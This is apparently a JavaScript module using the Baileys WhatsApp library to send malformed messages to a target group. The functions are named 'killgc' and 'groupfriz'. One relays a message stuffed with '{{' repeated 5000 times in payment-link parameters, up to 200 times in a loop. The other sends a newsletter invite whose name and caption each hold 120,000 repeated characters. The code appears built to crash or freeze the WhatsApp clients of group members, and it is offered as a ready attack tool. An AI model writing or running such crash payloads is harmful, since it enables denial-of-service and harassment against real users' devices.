const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

async function xgcs(sock, groupJid, opts = {}) {
  const total = opts.rounds || 200, ms = 3;
  const msg = generateWAMessageFromContent(groupJid, {
    extendedTextMessage: {
      text: '', matchedText: 'https://t.me/devor6core', description: '', title: '',
      paymentLinkMetadata: { button: { displayText: '' }, header: { headerType: 1 }, provider: { paramsJson: '{{'.repeat(5000) } },
      linkPreviewMetadata: {
        paymentLinkMetadata: { button: { displayText: '' }, header: { headerType: 1 }, provider: { paramsJson: '{{'.repeat(5000) } },
        urlMetadata: { fbExperimentId: 999 }, fbExperimentId: 888, linkMediaDuration: 555, socialMediaPostType: 1221
      }
    }
  }, { additionalAttributes: { edit: '7' } });

  for (let i = 0; i < total; i++) {
    try {
      await sock.relayMessage(groupJid, { groupStatusMessageV2: { message: msg.message } }, { messageId: null });
    } catch (e) { console.log(`[xgcs] ${i + 1}: ${e.message}`); break; }
    await new Promise(r => setTimeout(r, ms * 1000));
  }
}

async function xgc(sock, groupJid) {
  try {
    await sock.relayMessage(groupJid, {
      botInvokeMessage: { message: {
        newsletterAdminInviteMessage: {
          newsletterJid: '33333333333333333@newsletter',
          newsletterName: 'ꦾ'.repeat(120000), jpegThumbnail: null,
          caption: 'ꦽ'.repeat(120000), inviteExpiration: Date.now() + 1814400000
        }
      } }
    }, { userJid: groupJid });
  } catch (e) { console.log(`[xgc]: ${e.message}`); }
}

module.exports = { xgcs, xgroup: xgcs, groupfriz: xgcs, xgc, killgc: xgc };
